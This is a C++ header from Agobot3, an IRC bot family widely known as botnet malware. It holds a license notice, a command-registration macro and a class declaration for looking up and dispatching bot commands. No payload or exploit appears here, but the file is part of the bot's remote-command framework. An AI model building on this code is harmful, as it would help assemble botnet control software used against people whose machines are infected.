/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (c) 2004 Ago and the Agobot team
	All rights reserved.

	This is private software, you may redistribute it under the terms of
	the APL(Ago's Private License) which follows:
  
	Redistribution and use in binary forms, with or without modification,
	are permitted provided that the following conditions are met:
	1. The name of the author may not be used to endorse or promote products
	   derived from this software without specific prior written permission.
	2. The binary and source may not be sold and/or given away for free.
	3. The licensee may only create binaries for his own usage, not for any
	   third parties.
	4. The person using this sourcecode is a developer of said sourcecode.

	Redistribution and use in source forms, with or without modification,
	are not permitted.

	This license may be changed without prior notice.

	THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
	IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
	OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
	IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
	INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
	NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
	DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
	THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
	(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
	THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */

#ifndef __COMMANDS_H__
#define __COMMANDS_H__

#include "cstring.h"
#include "cmdbase.h"
#include "message.h"
#include "object.h"

void RegisterCommand(CommandInfo *pCommand);

// Params: a=var, b=cmd, c=description, d=fallback, e=handler class --> OLD <--
// Params: a=var, b=cmd, c=fallback, d=handler class

#define REGCMD(a, b, c, d) \
	class CTempRegister_##a { public: \
		CTempRegister_##a() { \
			strncpy(d->a.szName, b, sizeof(d->a.szName)); \
			d->a.pHandler=d; d->a.bFallBack=c; \
			RegisterCommand(&d->a); } }; \
	CTempRegister_##a g_cTempRegister_##a;
/*
	class CTempRegister_##a { public: \
		CTempRegister_##a() { \
			strncpy(e->a.szName, b, sizeof(e->a.szName)); \
			e->a.pHandler=e; e->a.bFallBack=d; \
			RegisterCommand(&e->a); } }; \
	CTempRegister_##a g_cTempRegister_##a;
*/
using namespace std;

class CCommands : public CCommandHandler
{
public:
					 CCommands();
	virtual			~CCommands();

	CommandInfo		*FindCommandByName(const char *szName, bool bExact);
	CommandInfo		*FindFallBack();

	bool			 HandleCommand(CMessage *pMsg);

	CommandInfo		 m_cmdListCmd;
protected:
	list<CommandInfo*>	 m_lCommands;
};

#endif // __COMMANDS_H__
